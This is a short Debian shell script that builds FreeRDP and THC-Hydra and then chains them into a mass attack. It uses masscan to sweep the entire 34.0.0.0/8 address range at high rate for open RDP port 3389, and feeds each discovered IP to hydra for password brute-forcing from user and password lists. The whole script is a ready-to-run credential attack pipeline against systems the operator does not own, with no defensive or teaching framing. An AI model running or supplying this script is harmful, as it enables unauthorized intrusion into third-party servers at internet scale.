# TESTED WORKING ON DEBIAN 10
apt update && apt install zlib1g-dev cmake flatpak x11-xserver-utils masscan libpcap-dev gnome-software-plugin-flatpak libssl-dev ninja-build build-essential git-core debhelper cdbs dpkg-dev autotools-dev cmake pkg-config xmlto libssl-dev docbook-xsl xsltproc libxkbfile-dev libx11-dev libwayland-dev libxrandr-dev libxi-dev libxrender-dev libxext-dev libxinerama-dev libxfixes-dev libxcursor-dev libxv-dev libxdamage-dev libxtst-dev libcups2-dev libpcsclite-dev libasound2-dev libpulse-dev libjpeg-dev libgsm1-dev libusb-1.0-0-dev libudev-dev libdbus-glib-1-dev uuid-dev libxml2-dev libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev libfaad-dev -y;
git clone https://github.com/FreeRDP/FreeRDP.git;
cd FreeRDP;
flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
flatpak install flathub org.freedesktop.Platform//19.08
flatpak install flathub org.freedesktop.Platform.ffmpeg-full//19.08
cmake .;
make -j8;
make install;
cd ..;
git clone https://github.com/vanhauser-thc/thc-hydra.git;
cd thc-hydra;
./configure && make -j8 && make install;
cd ..;
masscan --range 34.0.0.0-34.255.255.255 --rate 50000 -p3389 --open --banners -oG rdp.scan;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do hydra -vv rdp://$i -e ns -L user -P pass -t1 -W1 -I >hydra.log;
done
